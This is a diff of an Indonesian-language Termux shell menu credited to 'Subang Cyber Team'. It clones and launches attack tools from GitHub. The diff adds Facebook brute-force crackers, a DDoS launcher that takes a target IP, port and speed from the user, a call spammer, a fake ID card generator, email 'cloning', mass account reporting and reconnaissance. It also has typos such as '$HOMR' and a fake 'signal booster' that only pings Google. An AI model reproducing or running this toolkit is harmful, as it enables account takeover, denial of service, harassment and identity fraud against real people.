@@ -13,6 +13,7 @@
 #                   Subang Cyber Team			 #
 ##########################################################
 biru='\033[34;1m' #biru
+green='\e[0;32m' #hijau muda
 daun='\033[32;1m' #ijo
 purple='\033[35;1m' #purple
 cyyan='\033[36;1m' #cyan
@@ -43,72 +44,114 @@ echo $daun "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%"
 	echo		
 	echo
 echo $merah "[]=======================[]"
-sleep 1
+sleep 0.4
 echo $daun  "  1.Hack Facebook Target"
 echo $merah "[]=======================[]"
-sleep 1
+sleep 0.4
 echo $daun  "  2.Install Metasploit"
 echo $merah "[]=======================[]"
-sleep 1
+sleep 0.4
 echo $daun  "  3.Tools DDOS"
 echo $merah "[]=======================[]"
-sleep 1
+sleep 0.4
 echo $daun  "  4.SpamCall"
 echo $merah "[]=======================[]"
-sleep 1
+sleep 0.4
 echo $daun  "  5.KKKTP Generate"
+echo $merah "[]=======================[]"
+sleep 0.4
+echo $daun  "  6.Mempercepat Sinyal"
+echo $merah "[]=======================[]"
+sleep 0.4
+echo $daun  "  7.Install RED_HAWK"
+echo $merah "[]=======================[]"
+sleep 0.4
+echo $daun  "  8.Hack Facebook Iqbalz"
+echo $merah "[]=======================[]"
+sleep 0.4
+echo $daun  "  9.Yahoo Cloning"
+echo $merah "[]=======================[]"
+sleep 0.4
+echo $daun  "  10.Report Facebook"
+echo $merah "[]=======================[]"
+sleep 0.4
+echo $daun  "  11.Bot Komena { Sedang Perbaikan }"
 echo $merah "[]=======================[]"
 echo
 sleep 1
 echo $merah "[]=======================[]"
 echo $daun  "  0.Install Bahan"
 echo $merah "[]=======================[]"
-sleep 1
+sleep 0.4
 echo $daun  "  I.Info"
 echo $merah "[]=======================[]"
-sleep 1
+sleep 0.4
 echo $daun  "  E.Exit"
 echo $merah "[]=======================[]"
-sleep 1
+sleep 0.1
 echo $daun
 sleep 0.9
-read -p "dr460n >>" pilih
+read -p  "[root@dr460n]>> " pilih
 
 if [ $pilih = "1" ] || [ $pilih = "1" ]
 then
 clear
+echo $tai "Sedang Menginstall Package Tambahan .."
+sleep 1
 pkg install python
 pkg install python2 
 pip2 install mechanize
+echo $daun "Installing"
+sleep 1
 git clone https://github.com/Bl4ckDr460n/facebookbrute
 mv facebookbrute $HOME
 cd $HOME/facebookbrute
 python2 brute.py
+exit
 fi
 if [ $pilih = "2" ] || [ $pilih = "2" ]
 then
 clear
+echo $daun "installing"
+sleep 1
 git clone https://github.com/4L13199/meTAInstall
 mv meTAInstall $HOME
 cd $HOME/meTAInstall
+chmod 777 *
 sh meTAInstall.sh
 fi
 if [ $pilih = "3" ] || [ $pilih = "3" ]
 then
 clear
+echo $daun "Install Package Tambahan "
+sleep 1
 pkg install python
 pkg install python2
+echo $daun "Installing"
+sleep 1
 git clone https://github.com/Bl4ckDr460n/DDOS
 mv DDOS $HOME
+cd $HOME/DDOS
 clear
-echo $merah " Tinggal Ketik "$biru"cd $HOME/DDOS"
-echo $merah "Truss Ketik "$tai"python3 DDOS.py -s IP target -p 80 -t 135"
-sleep 3
+echo $tai "Masukan IP Target"$daun
+read -p "dr460n >>" target
+echo
+echo $tai "Masukan Port Target"$daun
+read -p "dr460n >>" p
+echo
+echo $tai "Masukan Kecepatan"$daun
+read -p "dr460n >>" t
+python3 DDOS.py -s $target -p $p -t $t
 fi
 if [ $pilih = "4" ] || [ $pilih = "2" ]
 then
 clear
+echo $daun "Install Package Tambahan"
+sleep 1
+pkg install php
 pkg install cowsay
+echo $daun "Installing"
+sleep 1
 git clone https://github.com/Bl4ckDr460n/spamcall
 mv spamcall $HOME
 cd $HOME/spamcall
@@ -118,12 +161,76 @@ fi
 if [ $pilih = "5" ] || [ $pilih = "5" ]
 then
 clear
+echo $daun "Install Package Tambahan"
+sleep 1
 pkg install php
+echo $daun "Installing"
+sleep 1
 git clone https://github.com/Bl4ckD460n/freekkktp
 mv freekkktp $HOME
 cd $HOME/freekkktp
 php ktp.php
 exit
+fi
+if [ $pilih = "6" ] || [ $pilih = "6" ]
+then
+clear
+echo $tai
+cowsay -f kiss.cow "BL4CKDR460N"
+echo 	
+echo			
+echo	$cyyan "      Code By "$merah"Bl4ck_Dr460n"
+echo
+echo
+echo
+echo $daun
+ping google.com
+fi
+if [ $pilih = "7" ] || [ $pilih = "7" ]
+then
+clear
+echo $daun "Install Package Tambahan"
+sleep 1
+pkg install php
+echo $daun "Installing"
+sleep 1
+git clone https://github.com/Tuhinshubhra/RED_HAWK
+mv RED_HAWK $HOME
+cd $HOME/RED_HAWK
+php rhawk.php
+exit
+fi
+if [ $pilih = "8" ] || [ $pilih = "8" ]
+then
+clear
+echo $daun "Installing"
+sleep 1
+git clone https://github.com/IqbalzNoobs/fb-brute
+mv fb-brute $HOME
+cd $HOME/fb-brute
+pip2 install mechanize
+python2 brute.py
+fi
+if [ $pilih = "9" ] || [ $pilih = "9" ]
+then
+clear
+echo $daun "Installing"
+sleep 1
+git clone https://github.com/FR13ND8/EmailVuln
+mv EmailVuln $HOME
+cd $HOMR/EmailVuln
+python2 vuln.py
+fi
+if [ $pilih = "10" ] || [ $pilih = "10" ]
+then
+clear
+echo $daun "Installing"
+sleep 1
+git clone https://github.com/IlayTamvan/Report
+mv Report $HOME
+cd $HOME/Report
+unzip Report.zip
+python2 Report.py
 fi
 if [ $pilih ="0" ] || [ $pilih = "0" ]
 then
@@ -174,23 +281,26 @@ echo
 echo $tai"["$daun"B"$tai"/"$daun"Q"$tai"]"
 echo $biru "Pilih"
 echo $daun
-read -p "dr460n >> " back
+read -p "[root@dr460n]>> " back
 fi
 if [ $back = "B" ] || [ $back = "b" ]
 then
 clear
+sh MyTools.sh
 fi
 if [ $back = "Q" ] || [ $back = "q" ]
 then
 clear
 echo $tai "Ya Udah Klo Exit"
-echo $green "BY BY........"
+echo $daun "BY BY........"
 exit
 fi
-
-*) clear
+if [ $pilih = "*" ] || [ $pilih = "*" ]
+then
+clear
 echo $merah "Anda Salah Memasukan "
 sleep 1
 echo $tai "Sedang Mengembalikan Ke Awal Tools"
 echo "Tunggu Bossq 3 Detik"
 sleep 3
+fi
